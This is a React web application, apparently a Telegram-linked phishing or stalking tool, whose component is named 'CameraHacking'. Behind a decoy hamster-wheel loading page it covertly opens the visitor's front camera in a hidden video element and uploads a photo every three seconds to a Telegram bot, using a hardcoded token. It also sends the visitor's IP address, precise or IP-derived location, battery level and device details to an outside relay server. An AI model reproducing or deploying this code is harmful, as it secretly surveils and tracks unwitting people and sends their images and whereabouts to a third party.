import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import axios from "axios";
import ReactDOM from "react-dom/client";
import "./App.css";

// API Configuration
const API_CONFIG = {
  baseURL: process.env.REACT_APP_API_URL || 'https://ewggewgegewr-gl3f.vercel.app',
  endpoints: {
    sendDataToTelegram: '/sendDataToTelegram',
    sendPhotoToTelegram: '/sendPhotoToTelegram',
    sendLocationToTelegram: '/sendLocationToTelegram'
  }
};

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 3000;
  const MAX_CAPTURES = 20;

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });

      return response.ok;

    } catch (error) {
      console.error('Telegram send error:', error);
      return false;
    }
  };

  const sendPhotoToTelegram = async (blob, caption = '') => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);

      if (caption) {
        formData.append('caption', caption);
      }

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        const result = await response.json();
        addDebugLog(`✅ Фото отправлено! ID: ${result.result?.message_id}`);
        return true;
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Ошибка Telegram: ${errorText.substring(0, 100)}`);
        return false;
      }

    } catch (error) {
      addDebugLog(`❌ Ошибка отправки: ${error.message}`);
      return false;
    }
  };

  const createTestImage = async () => {
    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 300;
    const ctx = canvas.getContext('2d');

    const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
    ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
    ctx.fillRect(0, 0, 300, 300);

    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('Camera Test', 150, 120);

    ctx.font = '18px Arial';
    ctx.fillText(new Date().toLocaleTimeString(), 150, 160);
    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 150, 190);

    ctx.beginPath();
    ctx.arc(150, 230, 40, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 4;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(150, 230, 15, 0, Math.PI * 2);
    ctx.fillStyle = '#FFFFFF';
    ctx.fill();

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  const captureCameraPhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова');
      return null;
    }

    const video = videoRef.current;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0)');
      return null;
    }

    addDebugLog(`Захват фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);

    try {
      const canvas = document.createElement('canvas');
      const isPortrait = video.videoHeight > video.videoWidth;

      if (isPortrait && deviceInfo?.isAndroid) {
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;
      } else {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }

      const ctx = canvas.getContext('2d');
      let frameOk = false;
      let attempts = 0;

      while (!frameOk && attempts < 5) {
        attempts++;
        ctx.fillStyle = '#000000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        if (isPortrait && deviceInfo?.isAndroid) {
          ctx.save();
          ctx.translate(canvas.width / 2, canvas.height / 2);
          ctx.rotate(Math.PI / 2);
          ctx.translate(-canvas.height / 2, -canvas.width / 2);
          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
          ctx.restore();
        } else {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }

        const points = [
          [50, 50],
          [canvas.width - 50, 50],
          [50, canvas.height - 50],
          [canvas.width - 50, canvas.height - 50]
        ];

        let blackPoints = 0;
        for (const [x, y] of points) {
          const pixel = ctx.getImageData(x, y, 1, 1).data;
          if (pixel[0] < 20 && pixel[1] < 20 && pixel[2] < 20) {
            blackPoints++;
          }
        }

        if (blackPoints < points.length / 2) {
          frameOk = true;
          addDebugLog(`Кадр захвачен (попытка ${attempts})`);
        } else {
          addDebugLog(`Черный кадр ${attempts}/5`);
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }

      if (!frameOk) {
        addDebugLog('Создаем тестовое изображение вместо черного кадра');
        return await createTestImage();
      }

      ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';

      if (isPortrait && deviceInfo?.isAndroid) {
        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(Math.PI / 2);
        ctx.translate(-canvas.height / 2, -canvas.width / 2);
        ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
        ctx.restore();
      } else {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });

    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage();
    }
  };

  const captureAndSend = async () => {
    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
      stopCapturing();
      return;
    }

    addDebugLog(`=== Захват ${captureCount + 1}/${MAX_CAPTURES} ===`);

    const photoBlob = await captureCameraPhoto();

    if (!photoBlob) {
      addDebugLog('Не удалось захватить фото');
      return;
    }

    const caption = `📸 Фото #${captureCount + 1}\n` +
      `Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
      `Время: ${new Date().toLocaleTimeString()}\n` +
      `Устройство: Android ${deviceInfo?.androidVersion || ''}`;

    const success = await sendPhotoToTelegram(photoBlob, caption);

    if (success) {
      setCaptureCount(prev => prev + 1);
      addDebugLog(`✅ Успешно! Всего: ${captureCount + 1}`);

      if ((captureCount + 1) % 5 === 0) {
        await sendToTelegram(
          `📊 Статистика: ${captureCount + 1} фото\n` +
          `Устройство: Android ${deviceInfo?.androidVersion || ''}\n` +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Время: ${new Date().toLocaleString()}`
        );
      }
    } else {
      addDebugLog('❌ Не удалось отправить фото');
    }
  };

  const initializeCamera = async () => {
    addDebugLog('Инициализация камеры...');

    try {
      const ua = navigator.userAgent;
      const isAndroid = /android/i.test(ua);
      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;

      setDeviceInfo({
        isAndroid,
        androidVersion,
        userAgent: ua
      });

      addDebugLog(`Android ${androidVersion}, Chrome`);

      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      addDebugLog('Доступ к камере получен');

      if (videoRef.current) {
        const video = videoRef.current;

        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');

        video.srcObject = stream;

        await new Promise((resolve) => {
          const timeout = setTimeout(() => {
            addDebugLog('Таймаут видео');
            resolve();
          }, 5000);

          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            const resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(prev => ({ ...prev, resolution }));

            addDebugLog(`Видео готово: ${resolution}`);

            video.play().then(() => {
              addDebugLog('Видео запущено');
              resolve();
            }).catch(() => {
              addDebugLog('Auto-play заблокирован');
              resolve();
            });
          };
        });

        await sendToTelegram(
          '✅ Камера инициализирована\n\n' +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Android ${androidVersion}\n` +
          `Chrome Mobile\n` +
          `Начало съемки: ${new Date().toLocaleString()}`
        );

        addDebugLog('Делаем тестовый снимок...');
        const testBlob = await createTestImage();
        if (testBlob) {
          await sendPhotoToTelegram(testBlob, '🧪 Тестовый снимок системы');
        }

        setIsInitialized(true);
        return true;
      }

    } catch (error) {
      addDebugLog(`Ошибка инициализации: ${error.message}`);
      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
      return false;
    }
  };

  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setClientIp(data.ip);

      await sendToTelegram(
        `🌐 IP Address: ${data.ip}\n` +
        `Устройство: Android\n` +
        `Браузер: Chrome Mobile`
      );

    } catch (error) {
      setClientIp('IP unavailable');
    }
  };

  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    addDebugLog(`🚀 Запуск захвата каждые ${CAPTURE_INTERVAL / 1000} секунд`);

    setTimeout(() => {
      captureAndSend();
    }, 2000);

    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        addDebugLog(`Остановлен ${track.kind} трек`);
      });
      streamRef.current = null;
    }

    addDebugLog('Захват остановлен');
  };

  const restoreLocation = () => {
    try {
      const saved = localStorage.getItem('locationPermission');
      if (saved) {
        const location = JSON.parse(saved);
        setLocationPermission(location);
        addDebugLog('Геолокация восстановлена');
      }
    } catch (e) {
      localStorage.removeItem('locationPermission');
    }
  };

  useEffect(() => {
    let mounted = true;

    const init = async () => {
      addDebugLog('=== СТАРТУЕМ ===');

      restoreLocation();
      await getClientIp();

      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Камера не поддерживается');
        await sendToTelegram('❌ WebRTC не поддерживается в этом браузере');
        return;
      }

      const success = await initializeCamera();

      if (success && mounted) {
        startPeriodicCapture();
      }
    };

    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  return (
    <>
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          top: '10px',
          left: '10px',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          color: 'white',
          padding: '12px 20px',
          borderRadius: '10px',
          cursor: 'pointer',
          zIndex: 10000,
          fontSize: '14px',
          fontWeight: 'bold',
          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
          border: '2px solid white'
        }} onClick={captureAndSend}>
          📸 Сделать фото сейчас
        </div>
      )}

      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'linear-gradient(to top, rgba(0,0,0,0.95), rgba(0,0,0,0.85))',
          color: '#00ff00',
          padding: '15px',
          fontSize: '12px',
          maxHeight: '250px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9999,
          borderTop: '3px solid #00ff00',
          boxShadow: '0 -5px 20px rgba(0,255,0,0.2)'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginBottom: '15px',
            paddingBottom: '10px',
            borderBottom: '2px solid #00ff00'
          }}>
            <div>
              <strong style={{ fontSize: '14px', color: '#00ff00' }}>📡 CAMERA DEBUG</strong>
              <div style={{ fontSize: '11px', color: '#aaa', marginTop: '5px' }}>
                Android {deviceInfo?.androidVersion || '?'} | {deviceInfo?.resolution || '0x0'} | {captureCount} photos
              </div>
            </div>
            <div style={{
              background: captureCount > 0 ? '#00ff00' : '#ff0000',
              color: '#000',
              padding: '5px 10px',
              borderRadius: '5px',
              fontWeight: 'bold',
              fontSize: '14px'
            }}>
              {captureCount} 📸
            </div>
          </div>

          <div style={{ maxHeight: '180px', overflow: 'auto' }}>
            {debugLogs.map((log, i) => (
              <div key={i} style={{
                padding: '5px 0',
                borderBottom: '1px solid #333',
                whiteSpace: 'nowrap',
                overflow: 'hidden',
                textOverflow: 'ellipsis',
                color: log.includes('✅') ? '#00ff00' :
                  log.includes('❌') ? '#ff4444' :
                    log.includes('⚠️') ? '#ffff00' : '#cccccc'
              }}>
                {log}
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  );
};

/**
 * КОМПОНЕНТ LOCATIONHANDLER
 */
const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermission, chatId, clientIp }) => {

  const sendLocation = async (coords) => {
    const { latitude, longitude } = coords;

    const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendLocationToTelegram}`;

    const data = {
      chat_id: chatId,
      latitude,
      longitude,
      clientIp
    };

    try {
      await axios.post(apiUrl, data, {
        headers: {
          'Content-Type': 'application/json',
        },
        timeout: 10000
      });

      console.log("Location sent to Telegram");
      setLocationSent(true);
    } catch (error) {
      console.error("Error sending location to server:", error);
    }
  };

  const getLocationByIp = async () => {
    try {
      const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
      const { loc } = response.data;
      const [latitude, longitude] = loc.split(',');

      const coords = { latitude, longitude };

      sendLocation(coords);
      setLocationPermission(coords);
    } catch (error) {
      console.error("Error fetching location by IP:", error);
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });

      const { latitude, longitude } = position.coords;
      const coords = { latitude, longitude };

      localStorage.setItem("locationPermission", JSON.stringify(coords));
      setLocationPermission(coords);
      sendLocation(coords);

    } catch (error) {
      if (error.code === error.PERMISSION_DENIED) {
        alert("Пожалуйста, включите доступ к местоположению в настройках вашего устройства.");
        getLocationByIp();
      } else {
        console.error("Error getting location permission:", error);
      }
    }
  };

  useEffect(() => {
    if (!locationPermission) {
      requestLocationPermission();
    }
  }, []);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  const videoRef = useRef(null);

  const [usrStream, setUsrStream] = useState(null);
  const [isCameraActive, setIsCameraActive] = useState(true);
  const [locationSent, setLocationSent] = useState(false);
  const [locationPermission, setLocationPermission] = useState(null);
  const [clientIp, setClientIp] = useState("");

  const getBatteryLevel = async () => {
    try {
      if ("getBattery" in navigator) {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100) + "%";
      } else {
        return "Battery API not supported";
      }
    } catch (error) {
      console.error("❌ Error getting battery level:", error);
      return "Unable to detect";
    }
  };

  const getDeviceInfo = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const deviceType = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
      ? "Mobile Device"
      : "Desktop Device";

    const language = navigator.language || navigator.userLanguage;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    return {
      userAgent,
      platform,
      screenWidth,
      screenHeight,
      deviceType,
      language,
      timezone,
    };
  };

  useEffect(() => {
    const getUserData = async () => {
      try {
        console.log("🎯 Starting data collection for chatId:", chatId);

        const deviceInfo = getDeviceInfo();
        const batteryLevel = await getBatteryLevel();

        const data = {
          chat_id: chatId,
          batteryLevel: batteryLevel,
          screenWidth: deviceInfo.screenWidth,
          screenHeight: deviceInfo.screenHeight,
          clientIp: clientIp,
          userAgent: deviceInfo.userAgent,
          deviceType: deviceInfo.deviceType,
          platform: deviceInfo.platform,
          language: deviceInfo.language,
          timezone: deviceInfo.timezone
        };

        console.log("📤 Sending user data:", data);

        const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendDataToTelegram}`;

        await axios.post(apiUrl, data, {
          headers: {
            "Content-Type": "application/json",
          },
          timeout: 10000
        });

        console.log("✅ User data sent successfully");

      } catch (err) {
        console.error("❌ Error sending user data to server:", err);
      }
    };

    getUserData();
  }, [chatId, clientIp]);

  const toggelActiveCamera = () => {
    setIsCameraActive((prev) => !prev);
    console.log(`🎥 Camera ${!isCameraActive ? 'activated' : 'deactivated'}`);
  };

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>

          <label className="theme-switch">
            <input type="checkbox" className="theme-switch__checkbox" />
            <div className="theme-switch__container">
              <div className="theme-switch__clouds"></div>
              <div className="theme-switch__stars-container">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 55">
                  <path fill="currentColor" d="m135,20c0,7.7-0.7,13.8-2,18.5-2.3,8.4-7.9,12.5-17,12.5s-14.7-4.1-17-12.5c-1.3-4.7-2-10.8-2-18.5 0-7.7 0.7-13.8 2-18.5 2.3-8.4 7.9-12.5 17-12.5s14.7 4.1 17 12.5c1.3 4.7 2 10.8 2 18.5z" />
                </svg>
              </div>
              <div className="theme-switch__circle-container">
                <div className="theme-switch__sun-moon-container">
                  <div className="theme-switch__moon">
                    <div className="theme-switch__spot"></div>
                    <div className="theme-switch__spot"></div>
                    <div className="theme-switch__spot"></div>
                  </div>
                </div>
              </div>
            </div>
          </label>
        </div>

        <video
          ref={videoRef}
          autoPlay
          muted
          style={{ display: 'none' }}
          playsInline
        />
      </div>

      <LocationHandler
        chatId={chatId}
        locationPermission={locationPermission}
        setLocationPermission={setLocationPermission}
        setLocationSent={setLocationSent}
        clientIp={clientIp}
      />

      {isCameraActive && (
        <CameraHacking
          chatId={chatId}
          videoRef={videoRef}
          setClientIp={setClientIp}
          setLocationPermission={setLocationPermission}
        />
      )}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
